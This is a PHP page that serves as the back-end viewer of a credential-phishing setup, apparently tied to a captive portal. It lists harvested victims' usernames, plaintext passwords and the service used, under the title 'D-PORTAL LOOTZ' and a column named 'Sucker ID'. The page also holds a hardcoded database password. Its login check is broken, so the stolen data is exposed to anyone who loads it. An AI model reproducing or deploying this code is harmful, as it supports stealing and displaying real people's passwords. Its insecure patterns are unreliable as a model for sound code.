<?php

if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === false){
    header("location: adminlogin.html");
    exit;
}
 
// Username is root
$user = 'webuser';
$password = 'S1ipperyNippl3ANDGrog';
 
// Database name is geeksforgeeks
$database = 'capportal';
 
// Server is localhost with
// port number 3306
$servername='localhost:3306';
$mysqli = new mysqli($servername, $user,
                $password, $database);
 
// Checking for connections
if ($mysqli->connect_error) {
    die('Connect Error (' .
    $mysqli->connect_errno . ') '.
    $mysqli->connect_error);
}
 
// SQL query to select data from database
$sql = "SELECT * FROM portallogins ORDER BY entry_id DESC";
$result = $mysqli->query($sql);
$mysqli->close();
?>
<!-- HTML code to display data in tabular format -->
<!DOCTYPE html>
<html lang="en">
 
<head>
    <meta charset="UTF-8">
    <title>D-PORTAL LOOTZ</title>
    <!-- CSS FOR STYLING THE PAGE -->
    <style>
        table {
            margin: 0 auto;
            font-size: large;
            border: 1px solid black;
        }
 
        h1 {
            text-align: center;
            color: #006600;
            font-size: xx-large;
            font-family: 'Gill Sans', 'Gill Sans MT',
            ' Calibri', 'Trebuchet MS', 'sans-serif';
        }
 
        td {
            background-color: #E4F5D4;
            border: 1px solid black;
        }
 
        th,
        td {
            font-weight: bold;
            border: 1px solid black;
            padding: 10px;
            text-align: center;
        }
 
        td {
            font-weight: lighter;
        }
    </style>
</head>
 
<body>
    <section>
        <h1>GeeksForGeeks</h1>
        <!-- TABLE CONSTRUCTION -->
        <table>
            <tr>
                <th>Sucker ID</th>
                <th>Username</th>
                <th>Password</th>
                <th>Service Used</th>
                <th>Date/Time Stamp</th>
            </tr>
            <!-- PHP CODE TO FETCH DATA FROM ROWS -->
            <?php
                // LOOP TILL END OF DATA
                while($rows=$result->fetch_assoc())
                {
            ?>
            <tr>
                <!-- FETCHING DATA FROM EACH
                    ROW OF EVERY COLUMN -->
                <td><?php echo $rows['entry_id'];?></td>
                <td><?php echo $rows['username'];?></td>
                <td><?php echo $rows['password'];?></td>
                <td><?php echo $rows['service_used'];?></td>
                <td><?php echo $rows['entry_date'];?></td>
            </tr>
            <?php
                }
            ?>
        </table>
    </section>
</body>
 
</html>
